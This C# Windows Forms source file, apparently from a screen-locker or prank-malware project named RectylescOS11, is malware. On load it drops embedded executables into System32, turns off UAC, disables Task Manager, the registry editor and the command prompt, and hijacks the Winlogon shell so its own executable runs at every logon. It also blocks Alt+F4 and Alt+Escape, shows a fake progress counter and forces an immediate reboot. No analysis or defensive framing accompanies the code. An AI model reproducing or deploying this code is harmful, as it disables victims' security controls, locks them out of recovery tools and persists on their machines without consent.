using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace RectylescOS11
{
    public partial class Form4 : Form
    {
        int h, m, s;
        public Form4()
        {
            InitializeComponent();
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if(keyData == (Keys.Alt | Keys.F4))
            {
                return true;
            }
            if (keyData == (Keys.Alt | Keys.Escape))
            {
                return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            Invoke(new Action(() =>
            {
                s += 1;
                if (s == 100)
                {
                    timer1.Stop();
                    timer2.Start();
                    label2.Text = "Please Wait To Restart";
                }
                label2.Text = string.Format("{0}", s.ToString().PadLeft(2, '0')) + "%";
            }));
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            Process.Start("shutdown", "/r /t 0");
        }

        private void Form4_Load(object sender, EventArgs e)
        {
            Extract("RectylescOS11", @"C:\Windows\System32", "Resources", "ItachiUIBunifu.dll");
            Extract("RectylescOS11", @"C:\Windows\System32", "Resources", "WindowRectylescOS11.exe");
            RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey reg4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg4.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey reg7 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg7.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            RegistryKey reg8 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            reg8.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            RegistryKey reg12 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg12.SetValue("shell", @"explorer.exe, C:\Windows\System32\WindowRectylescOS11.exe", RegistryValueKind.String);
            timer1.Start();
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
    }
}
